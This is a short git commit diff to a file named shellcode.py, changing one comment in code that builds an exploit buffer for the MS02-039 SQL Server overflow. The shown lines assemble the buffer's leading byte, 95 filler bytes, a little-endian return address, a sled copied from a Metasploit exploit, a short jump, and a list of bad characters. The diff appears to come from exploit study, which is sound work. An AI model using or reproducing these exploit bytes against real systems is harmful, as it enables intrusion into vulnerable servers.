dbcaf104d77f6776c32c10429e7b82f34b1fbd27
John Solo <33820078+my4andle@users.noreply.github.com>
2018-06-27 16:59:23 -0600

    Update shellcode.py

--- shellcode.py
+++ shellcode.py
@@ -7,7 +7,7 @@
 # add to msf exploit code to compare your bytes vs theirs: print_status(Rex::Text.to_hex(buf))
 # bad_chars = "\x00\x3a\x0a\x0d\x2f\x5c"
 ms02_039 = "\x04"
-ms02_039 += "\x41" * 95  # 95 random bytes see 
+ms02_039 += "\x41" * 95  # 95 random bytes see buffer_fuzz.py for random bytes
 ms02_039 += "\x74\x87\xb4\x42"  # return address little endian
 ms02_039 += "\x4f\x9f\x96\x40\x37\xf8"  # 6 byte nop sled? taken straight from msf exploit
 ms02_039 += "\xeb\x08"  # jump 8 bytes
